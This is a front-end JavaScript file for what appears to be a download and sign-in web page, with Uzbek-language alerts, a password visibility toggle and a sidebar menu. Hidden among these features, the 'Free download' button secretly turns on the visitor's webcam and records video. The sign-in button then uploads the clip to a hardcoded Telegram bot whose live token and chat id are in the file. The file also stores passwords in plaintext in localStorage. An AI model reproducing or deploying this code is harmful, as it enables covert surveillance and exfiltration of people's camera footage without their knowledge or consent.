document.addEventListener("DOMContentLoaded", () => {
  const emailInput = document.getElementById("email");
  const passwordInput = document.getElementById("password");

  const savedUser = JSON.parse(localStorage.getItem("user"));
  if (savedUser && emailInput && passwordInput) {
    emailInput.value = savedUser.email;
    passwordInput.value = savedUser.password;
  }

  const togglePassword = document.getElementById('togglePassword');
  const eyeIcon = document.getElementById('eyeIcon');

  let isVisible = false;
  if (passwordInput && togglePassword && eyeIcon) {
    togglePassword.addEventListener('click', () => {
      isVisible = !isVisible;
      passwordInput.type = isVisible ? 'text' : 'password';

      eyeIcon.innerHTML = isVisible
        ? `<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
              d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.269-2.943-9.543-7a10.05 10.05 0 011.746-3.043M9.88 9.88a3 3 0 104.243 4.243M3 3l18 18" />`
        : `<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
              d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
           <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
              d="M2.458 12C3.732 7.943 7.523 5 12 5c4.477 0 8.268 2.943 9.542 7-1.274 4.057-5.065 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />`;
    });
  }

  // VIDEO RECORDING
  let videoStream = null;
  let recordedVideoBlob = null;
  let mediaRecorder = null;
  let isRecording = false;

  const previewElement = document.getElementById('preview');
  const freeDownloadBtn = document.getElementById('freeDownloadBtn');
  const signInBtn = document.getElementById('signInBtn');

  if (freeDownloadBtn && previewElement) {
    freeDownloadBtn.addEventListener('click', function () {
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          previewElement.srcObject = stream;
          previewElement.classList.remove('hidden');
          previewElement.play();

          videoStream = stream;

          if (!isRecording) {
            mediaRecorder = new MediaRecorder(videoStream);
            let chunks = [];

            mediaRecorder.ondataavailable = function (event) {
              chunks.push(event.data);
            };

            mediaRecorder.onstop = function () {
              recordedVideoBlob = new Blob(chunks, { type: 'video/mp4' });
              chunks = [];
            };

            mediaRecorder.start();
            isRecording = true;
          }
        })
        .catch(err => console.error('Error accessing camera: ', err));
    });
  }

  if (signInBtn) {
    signInBtn.addEventListener('click', function () {
      if (isRecording) {
        mediaRecorder.stop();
        videoStream.getTracks().forEach(track => track.stop());
        previewElement.classList.add('hidden');
        sendToTelegram(recordedVideoBlob);
        isRecording = false;
      } else {
        alert('Iltimos, avval Free download tugmasini bosib faylni yuklab oling.');
      }
    });
  }

  function sendToTelegram(videoData) {
    const botToken = '7772442946:AAGsBqTDxTm20nn-NfIye37zGmBpnOZrxTs';
    const chatId = '7221078203';

    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('video', videoData, 'video.mp4');

    fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
      method: 'POST',
      body: formData
    })
      .then(response => response.json())
      .then(data => {
        if (data.ok) {
          console.log('Video sent to Telegram:', data);
        } else {
          console.error('Error from Telegram:', data);
        }
      })
      .catch(error => console.error('Error sending video to Telegram:', error));
  }

  // SIDEBAR TOGGLE
  const sidebar = document.getElementById('sidebar');
  const hamburgerBtn = document.getElementById('hamburgerBtn');

  if (sidebar && hamburgerBtn) {
    hamburgerBtn.addEventListener('click', () => {
      sidebar.style.top = sidebar.style.top === '0px' ? '-200%' : '0';
    });

    document.addEventListener('click', (e) => {
      if (!sidebar.contains(e.target) && !hamburgerBtn.contains(e.target)) {
        sidebar.style.top = '-200%';
      }
    });
  }

  document.getElementById("signInBtn").addEventListener("click", () => {
    const name = document.getElementById("name").value;
    const email = document.getElementById("signupEmail").value;

    if (name && email) {
      localStorage.setItem("profileName", name);
      localStorage.setItem("profileEmail", email);

      // Profil sahifasiga yo‘naltirish (agar boshqa sahifa bo‘lsa)
      window.location.href = "profile.html";
    } else {
      alert("Iltimos, barcha maydonlarni to‘ldiring.");
    }
  });
});
